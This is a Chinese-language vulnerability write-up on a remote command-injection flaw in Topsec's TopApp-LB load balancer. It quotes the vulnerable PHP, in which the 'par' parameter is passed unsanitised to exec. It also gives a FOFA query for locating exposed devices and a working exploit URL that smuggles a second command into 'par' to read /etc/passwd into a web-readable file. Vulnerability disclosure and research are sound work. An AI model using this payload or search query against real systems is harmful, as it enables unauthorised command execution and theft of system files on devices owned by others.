# 天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞

## 漏洞描述

天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令

## 漏洞影响

```
天融信 TopSec-LB
```

## FOFA

```
app="天融信-TopApp-LB-负载均衡系统"
```

## 漏洞复现

登录页面如下



![](./images/202202091923792.png)



漏洞文件为 **enable_tool_debug.php**



```php
<?php
require_once dirname(__FILE__)."/../common/commandWrapper.inc";
error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);
$val = $_GET['val'];
$tool = $_GET['tool'];
$par = $_GET['par'];
runTool($val,$tool,$par);
?>
```



**commandWrapper.inc** 文件中的 **runTool**



```php
function runTool($val,$tool,$par){
	if($val=="0"){
		UciUtil::setValue('system', 'runtool', 'tool', $tool);
		UciUtil::setValue('system', 'runtool', 'parameter', $par);
		UciUtil::commit('system');
		if($tool=="1"){
			exec('ping '.$par.'>/tmp/tool_result &');
		}else if($tool=="2"){
			exec('traceroute '.$par.'>/tmp/tool_result &');
		}
	}else if($val=="1"){
		$tool=UciUtil::getValue('system', 'runtool', 'tool');
		if($tool=="1"){
			exec('killall ping ');
		}else if($tool=="2"){
			exec('killall traceroute ');
		}
		UciUtil::setValue('system', 'runtool', 'tool', '');
		UciUtil::setValue('system', 'runtool', 'parameter', '');
		UciUtil::commit('system');
		exec('echo "">/tmp/tool_result');
	}
	
}
```



这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行



```plain
/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |'
```



![](./images/202202091941884.png)